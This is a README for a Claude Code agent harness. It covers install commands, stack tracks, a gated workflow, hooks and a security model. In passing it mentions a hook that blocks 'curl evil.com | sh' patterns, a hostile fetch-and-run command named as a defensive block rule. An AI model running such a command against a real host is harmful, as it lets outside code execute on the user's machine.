# uzys-claude-harness

> A Claude Code agent harness — 6-gate workflow + Ralph loop + 9 stack tracks. Lean by design.

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Version](https://img.shields.io/github/v/tag/uzysjung/uzys-claude-harness?label=version)](https://github.com/uzysjung/uzys-claude-harness/releases)
[![Tests](https://img.shields.io/badge/tests-111%20PASS%20%2F%200%20FAIL-brightgreen)](scripts/test-harness.sh)
[![CI](https://github.com/uzysjung/uzys-claude-harness/actions/workflows/test.yml/badge.svg)](https://github.com/uzysjung/uzys-claude-harness/actions)

🇰🇷 **한국어 README**: [README.ko.md](./README.ko.md)

## 30-second start

```bash
# in your project directory:
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track csr-fastapi --project-dir .

# then start Claude Code:
claude
> /uzys:spec    # define what you're building
> /uzys:auto    # run the full pipeline (Plan → Build → Test → Review → Ship)
```

Replace `csr-fastapi` with one of: `csr-supabase`, `csr-fastify`, `ssr-nextjs`, `ssr-htmx`, `data`, `executive`, `tooling`, `full` — see [Tracks](#tracks-full-reference).

## Why this?

| Use it when… | Skip it when… |
|--------------|---------------|
| You want a **deterministic 6-gate workflow** (Spec → Ship) instead of free-form chat | You're doing a single-line fix and just need plain Claude Code |
| You work across **multiple stacks** (Python REST + React, Next.js, data/PySide6, executive docs) and want one harness | You only ever touch one stack and one set of tools |
| You want **ECC, agent-skills, Anthropic skills, Railway, Supabase** wired up per-track without manual setup | You prefer to install each plugin/MCP yourself with full control |
| You want the LLM constrained by **hooks** (file protection, security scan, gate ordering) — not just prompts | You want minimal intervention between the model and the filesystem |
| You value **lean** — every Rule/Hook earns its place; obvious linter-territory stuff is removed | You like comprehensive style guides and "best practices" enforced everywhere |

## What is this?

A **deterministic harness** around [Claude Code](https://claude.com/claude-code) that:

- Enforces a **6-gate workflow** (`Spec → Plan → Build → Test → Review → Ship`) via hooks
- Supports **9 stack tracks** (csr-supabase / csr-fastify / csr-fastapi / ssr-htmx / ssr-nextjs / data / executive / tooling / full)
- Bundles **vetted plugins, skills, MCP servers, and agents** per track ([docs/REFERENCE.md](./docs/REFERENCE.md))
- Stays **lean** — Rule 17 files / Hook 6 auto-registered. Removes anything obvious or duplicate.
- Self-improves via **continuous-learning + Ralph loop** (SPEC-driven autonomous cycle)
- Project-scoped only. **Global `~/.claude/` is never touched.**

Built for senior engineers / multi-role users (CEO/CTO/CISO/data scientist) who want the same harness across very different stacks.

## Installation

### Step 1 — Pick your Track

| Stack you're building | Track to install |
|----------------------|----------------|
| Python REST API + React/shadcn/ui | `csr-fastapi` |
| TypeScript REST API + React/shadcn/ui | `csr-fastify` |
| Realtime / Auth / Postgres (Supabase) + React/shadcn/ui | `csr-supabase` |
| SEO + React/shadcn/ui (SSR) | `ssr-nextjs` |
| Minimal JS (server-rendered + HTMX + daisyUI) | `ssr-htmx` |
| Data analysis / ML / DL / PySide6 desktop | `data` |
| Proposals / PPT / financial models (no code) | `executive` |
| Bash / CLI / markdown meta-projects | `tooling` |
| Two or more (e.g., tooling + Python) | `--track tooling --track csr-fastapi` (multi) or `full` |

### Step 2 — Install

Replace `<TRACK>` with your choice from above (e.g., `csr-fastapi`).

```bash
# in your project directory:
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track <TRACK> --project-dir .
```

That single line does:
1. Shallow-clones the harness to a temp dir
2. Runs `setup-harness.sh --track <TRACK>` in your project
3. Cleans up the temp dir

After install you'll see an Installation Report (`✅` row per category).

### Step 3 — Start Claude Code

```bash
claude
# inside Claude Code:
/uzys:spec    # define what you're building
/uzys:auto    # then run the full pipeline (Plan → Build → Test → Review → Ship)
```

---

## Common scenarios

### Add another Track to an existing install

Already installed `csr-fastapi`? Want to also add `tooling` (for the harness's own bash/markdown work)?

**Remote (recommended — no clone needed)**:
```bash
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --add-track tooling --project-dir .
```

**From local clone**:
```bash
bash /path/to/uzys-claude-harness/scripts/setup-harness.sh --add-track tooling --project-dir .
```

`--add-track` preserves existing `.claude/*` and merges new MCPs into `.mcp.json` via `jq` (idempotent).

### Update an existing install to the latest harness version

When a new release comes out (check [CHANGELOG.md](./CHANGELOG.md)):

**Remote (recommended)**:
```bash
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --update --project-dir .
```

**From local clone**:
```bash
bash /path/to/uzys-claude-harness/scripts/setup-harness.sh --update --project-dir .
```

What `--update` does:
1. **Backup** — snapshots current `.claude/` to `.claude.backup-<timestamp>/`
2. **Overwrite** — replaces `rules/*.md`, `agents/*.md`, `commands/uzys/*.md`, `hooks/*.sh`, `.claude/CLAUDE.md` with latest templates (only files that already exist — no Track creep)
3. **Prune orphans** — removes files in `.claude/` that no longer exist in templates (e.g., deprecated `ecc-security-common.md`)
4. **Clean stale hook refs** — removes `settings.json` PreToolUse/PostToolUse entries that point to non-existent hook files

**Preserved**: `gate-status.json`, `.mcp.json` (your custom MCPs stay), `docs/SPEC.md`/`PRD.md`, `.claude/settings.local.json`.

Rollback if needed:
```bash
rm -rf .claude && mv .claude.backup-<timestamp> .claude
```

### Install on this repo itself (dogfooding)

```bash
git clone https://github.com/uzysjung/uzys-claude-harness.git
cd uzys-claude-harness
bash scripts/setup-harness.sh --track tooling --project-dir .
```

### Multi-Track in one go (union)

```bash
bash scripts/setup-harness.sh --track tooling --track csr-fastapi --project-dir .
```

Use this when you know upfront you need multiple tracks. Faster than two separate runs.

### Optional — install ECC plugin project-scoped

In an **interactive terminal** (or `curl | bash` — works via `/dev/tty`), `setup-harness.sh` asks:

```
[ECC] Install ECC plugin project-scoped (copy)? [y/N]
[ECC] Prune unused items (keep 89 curated)? [y/N]
```

Answering `y` to both copies [Everything-Claude-Code](https://github.com/affaan-m/everything-claude-code) to `.claude/local-plugins/ecc/` and prunes ~228 unused items. Use it via:

```bash
claude --plugin-dir .claude/local-plugins/ecc
# or alias in ~/.zshrc:
# alias claude-ecc='claude --plugin-dir .claude/local-plugins/ecc'
```

The global `~/.claude/` is never touched.

### Interactive prompts — what asks, when, how to skip

`setup-harness.sh` has 4 optional prompts. Each has an explicit flag for unattended/CI use.

| Prompt | When does it appear? | Auto-y flag |
|--------|---------------------|-------------|
| **Track selection** (1-9) | `--track` not given AND TTY available | `--track <name>` |
| **GSD orchestrator** | dev track AND fresh install (not `--add-track`) AND TTY available | `--gsd` |
| **Trail of Bits security** | dev track AND fresh install AND TTY available | `--with-tob` |
| **ECC project-scoped install** | fresh install AND TTY available | `--with-ecc` |
| **ECC prune (89 KEEP)** | After ECC install confirmed | `--with-prune` (implies `--with-ecc`) |

#### Environment ↔ prompt behavior matrix

| Environment | TTY available? | Prompts shown? |
|-------------|:-:|:-:|
| Local terminal `bash setup-harness.sh ...` | ✅ | ✅ |
| **`curl … \| bash …` from terminal** | ✅ (via `/dev/tty`) | ✅ |
| CI runner / SSH `-T` no-tty | ❌ | ❌ (auto-skip; use flags) |

#### `--add-track` and `--update`: prompts are SUPPRESSED by default

To avoid re-prompting when augmenting an existing install, ECC/ToB/GSD prompts are **silently skipped** for `--add-track` and `--update`. If you actually want to add ECC/ToB during `--add-track`, use the explicit flag:

```bash
# Add csr-supabase to existing install AND install ECC at the same time
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --add-track csr-supabase --with-ecc --with-prune --project-dir .
```

#### Full unattended install (CI / scripts)

```bash
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track csr-fastapi --project-dir . \
    --with-ecc \         # install ECC plugin project-scoped (no prompt)
    --with-prune \       # also prune (implies --with-ecc)
    --with-tob \         # install Trail of Bits security plugin
    --gsd                # include GSD orchestrator
```

| Flag | Effect |
|------|--------|
| `--with-ecc` | Skip "install ECC?" prompt → `y` |
| `--with-prune` | Skip "prune ECC?" prompt → `y` (auto-enables `--with-ecc`) |
| `--with-tob` | Skip "Trail of Bits?" prompt → `y` |
| `--gsd` | Install GSD orchestrator |

### Other flags

```bash
bash scripts/setup-harness.sh --help                 # show full options
```

### Prerequisites

- Node.js 22+
- Git
- Claude Code CLI (`claude`)
- jq (recommended; bash fallback exists)

## Tracks (full reference)

| Track | Stack | Role | Auto-installed |
|-------|-------|------|----------------|
| `csr-supabase` | Supabase + React/shadcn/ui | Developer | + Tauri, Supabase MCP, Vercel CLI, Netlify CLI |
| `csr-fastify` | TypeScript REST API + React/shadcn/ui | Developer | + Tauri, Railway MCP |
| `csr-fastapi` | Python REST API + React/shadcn/ui | Developer | + Tauri, Railway MCP |
| `ssr-htmx` | FastAPI + Jinja2 + HTMX + daisyUI | Developer | + Railway MCP |
| `ssr-nextjs` | Next.js + shadcn/ui | Developer | + Railway MCP, next-skills |
| `data` | Python + DuckDB + Trino + ML/DL + PySide6 | Data Scientist | + polars/dask/wshobson skills, Anthropic data plugin |
| `executive` | PPT/Excel/Word/PDF + proposals/DD | CPO/CSO/CTO | + document-skills, c-level-skills, finance-skills |
| `tooling` | Bash + Markdown + CLI tools (meta projects) | Tool Developer | + cli-development rules |
| `full` | Union of everything | All | All MCPs + all plugins |

Common to all dev tracks: `addy-agent-skills`, `Impeccable`, `Playwright`, `find-skills`, ADR skill, `context7` MCP, `github` MCP, `chrome-devtools` MCP. Full asset list: [docs/REFERENCE.md](./docs/REFERENCE.md).

## How it works

```
┌────────────────────────────────────────────────────────────────┐
│  Project (.claude/)                                             │
│  CLAUDE.md  →  11 principles + Decision meta-rule + gates       │
│                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ commands/   │  │ rules/ (17) │  │ skills/     │             │
│  │ uzys:* (7)  │  │ git-policy  │  │ CL-v2       │             │
│  │ ecc:*  (8)  │  │ test-policy │  │ spec-scaling│             │
│  │             │  │ ship-       │  │ deep-       │             │
│  │             │  │ checklist   │  │ research    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ agents/ (8) │  │ hooks/ (6)  │  │ .mcp.json   │             │
│  │ reviewer    │  │ session     │  │ context7    │             │
│  │ data-       │  │ protect     │  │ github      │             │
│  │ analyst     │  │ gate-check  │  │ chrome-     │             │
│  │ strategist  │  │ agentshield │  │ devtools    │             │
│  │ + 5 ECC     │  │ + 1 utility │  │ + per-track │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
└────────────────────────────────────────────────────────────────┘
```

The 6-gate workflow is enforced by `gate-check.sh` (PreToolUse hook). Skipping a gate returns exit 2 with a blocker message. `/uzys:auto` runs the full pipeline as a Ralph loop until SPEC compliance is met (max 5 iterations).

## Example workflow

Building "an internal note-taking app with Postgres + Auth" on `csr-fastapi`:

```bash
# 1. Install harness on a fresh project
mkdir notes && cd notes && git init
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track csr-fastapi --project-dir .

# 2. Open Claude Code
claude

# Inside Claude Code:
> /uzys:spec
# → Pre-SPEC questionnaire kicks in:
#   - Prod DB engine?            "Postgres 16 (Railway)"
#   - Test DB strategy?          "testcontainer (Postgres 16)"
#   - External deps?             "GitHub OAuth (Live staging E2E required)"
#   - Critical E2E flows?        "login → callback → /me, create note"
#   - DESIGN.md/.impeccable.md?  "no — invoke /teach to set design tone first"
# → docs/SPEC.md generated with Objective, AC, Non-Goals, DO NOT CHANGE

> /uzys:auto
# → Plan: trivial=skip, standard=milestones (3-5), complex=full task list
#   (model-aware — Opus skips micro-decomposition, Haiku gets detailed)
# → Build: per task, write failing test (RED) → implement (GREEN) → refactor
# → Test: testcontainer Postgres + Live OAuth E2E (Mock not allowed)
# → Review: 5-axis (correctness/readability/architecture/security/perf)
#   via reviewer subagent (context: fork) — separate from implementor
# → Ship: agentshield scan + SPEC drift check + Railway deploy
# → Ralph loop iterates max 5 times if SPEC AC not met, then escalates
```

Behind the scenes:
- `protect-files.sh` blocks Edits to `.env`, lock files, credentials
- `gate-check.sh` blocks `/uzys:plan` if `define.completed=false`
- `mcp-pre-exec.sh` enforces MCP allowlist + blocks `curl evil.com | sh` patterns
- `agentshield-gate.sh` blocks `/uzys:ship` on CRITICAL findings

## 11 Behavioral Principles

Distilled from Karpathy's LLM observations + Anthropic Harness Design + production agent operations:

1. **Think Before Acting** — No assumptions
2. **Simplicity First** — Unmentioned = out of scope
3. **Surgical Changes** — Touch only what's needed; DO NOT CHANGE protection
4. **Goal-Driven Execution** — Verifiable success criteria
5. **Separate Eval from Gen** — SOD via reviewer subagent (context fork)
6. **Long-Running Management** — Phases + human gates
7. **Fact vs Opinion** — Sources required
8. **Sprint Contract** — Define "done" before starting
9. **Circuit Breakers** — 3 failures → stop and report
10. **Harness Maintenance** — Start simple, add only when needed, prune quarterly
11. **Perimeter Not Blueprint** — Define what+why+boundaries; let the agent decide how

Plus a **Decision Making meta-rule**: every value judgment must be backed by an explicit, verifiable criterion. No vibes-based decisions.

## Documentation

| File | Purpose |
|------|---------|
| [README.ko.md](./README.ko.md) | Korean version of this README |
| [docs/USAGE.md](./docs/USAGE.md) | Day-to-day workflow guide (`/uzys:*` commands, gate flow) |
| [**docs/REFERENCE.md**](./docs/REFERENCE.md) | **Catalog of all installed assets** (Plugins / Skills / MCP / Agents / Cherry-pick) with trust tier and exact install commands |
| [CONTRIBUTING.md](./CONTRIBUTING.md) | How to add tracks / rules / hooks / commands |
| [CHANGELOG.md](./CHANGELOG.md) | Release history |

## Optional ECC integration

[Everything-Claude-Code (ECC)](https://github.com/affaan-m/everything-claude-code) bundles 300+ skills/agents/commands. The `scripts/setup-harness.sh` end-of-flow offers a 2-step prompt:

```
[ECC] Plugin 프로젝트 스코프 설치 (선택사항)
  1. Install ECC project-scoped (copy)? [y/N]
  2. Prune unused items (keep 89 curated)? [y/N]
  → DELETED/KEPT file list shown after prune
```

Run with `claude --plugin-dir .claude/local-plugins/ecc` afterwards. Global `~/.claude/` stays untouched.

## Installation report

After `scripts/setup-harness.sh` completes you get a verification table:

```
│ Category         │ Found  │ Expected │ Status │
│ Rules            │ 8      │ 8        │   ✅   │
│ Commands uzys:   │ 7      │ 7        │   ✅   │
│ Commands ecc:    │ 8      │ 8        │   ✅   │
│ Agents           │ 8      │ 8        │   ✅   │
│ Hooks            │ 7      │ 7        │   ✅   │
│ Skills           │ 7      │ 7        │   ✅   │
│ MCP servers      │ 3      │ 3        │   ✅   │
│ .mcp-allowlist   │ yes    │ yes      │   ✅   │
│ settings.json    │ yes    │ yes      │   ✅   │
│ Plugins          │ tried  │ network  │   ✅   │
```

CI runs `bash scripts/test-harness.sh --quick` (≈5s, 85 tests) on every PR.

## Security model

- **MCP allowlist**: `.mcp-allowlist` file gates every MCP call via `mcp-pre-exec.sh` hook
- **D16 protection**: `setup-harness.sh --project-dir` blocks `~/.claude/*`, `/etc/*`, system bins
- **`.env` / credentials shielded**: `protect-files.sh` hook blocks Write/Edit on protected paths
- **Pre-ship security gate**: `agentshield-gate.sh` runs `npx ecc-agentshield scan` before `/uzys:ship`
- See [docs/REFERENCE.md §8](./docs/REFERENCE.md#8-보안--신뢰-정책) for the full security policy

## Project Direction

This harness is built around three commitments (see `templates/CLAUDE.md`):

1. **ECC.tools dependency** — minimal in-house code; orchestrate ECC skills/agents via `/uzys:*`
2. **Ralph loop autonomy** — SPEC-based autonomous cycle via continuous-learning-v2 + `/uzys:auto`
3. **Lean by design** — feature additions only after "is this in ECC already?" check; quarterly P10 audit

## FAQ

**Q. Does this work on Linux / WSL / Windows?**
A. macOS + Linux (incl. WSL) are tested in CI. Native Windows shell is not supported — use WSL.

**Q. Will it touch my global `~/.claude/`?**
A. No. `setup-harness.sh --project-dir` blocks `~/.claude/*`, `/etc/*`, `/usr/bin/*` etc. (D16 protection). All installation is project-scoped.

**Q. What if I already installed an older version?**
A. `bash scripts/setup-harness.sh --update --project-dir .` — backs up `.claude/` to `.claude.backup-<ts>/`, overwrites only existing files with latest templates, prunes orphans (e.g., deprecated rule files), cleans stale hook references in `settings.json`.

**Q. Why 9 Tracks? Isn't that over-engineered?**
A. Tracks are conditional install lists, not abstractions. Adding a Track = one TSV row + one rule mapping. No runtime cost. Use only the Tracks you need; `--track` selection is explicit.

**Q. Can I use this without ECC plugin?**
A. Yes. ECC is opt-in (interactive prompt or `--with-ecc` flag). The 6-gate workflow + agent-skills + per-track plugins work standalone.

**Q. How do I add a new Track / Rule / Hook?**
A. See [CONTRIBUTING.md](./CONTRIBUTING.md) — step-by-step guide for each.

**Q. Can I use this with Cursor / Codex instead of Claude Code?**
A. Not yet. Hooks and `settings.json` syntax are Claude Code specific. Most agent-skills (npx skills) work cross-host (Agent Skills standard), but the harness orchestration is Claude-specific.

**Q. The harness feels opinionated. Can I override?**
A. Yes. After `--update` the harness regenerates files; before, you can edit any `.claude/rules/*.md` or `templates/*` and they stick. `setup-harness.sh` only overwrites on `--update`.

## License

MIT — Copyright (c) 2026 Jay (Uzys Jung). See [LICENSE](./LICENSE).

## References

Core design influences (full asset catalog in [docs/REFERENCE.md](./docs/REFERENCE.md)):

- [agent-skills](https://github.com/addyosmani/agent-skills) — 6-gate workflow backbone
- [Everything-Claude-Code](https://github.com/affaan-m/everything-claude-code) — vetted skills/agents/commands
- [Anthropic skills](https://github.com/anthropics/skills) — document workflows (pptx/docx/xlsx/pdf)
- [Impeccable](https://github.com/pbakaus/impeccable) — design quality
- [Railway](https://docs.railway.com) — deployment integration
- [HyperAgents](https://arxiv.org/abs/2603.19461) — self-improvement architecture
- [gitagent](https://github.com/open-gitagent/gitagent) — SOD via reviewer subagent
- Karpathy LLM observations + Anthropic Harness Design — principles 1–11
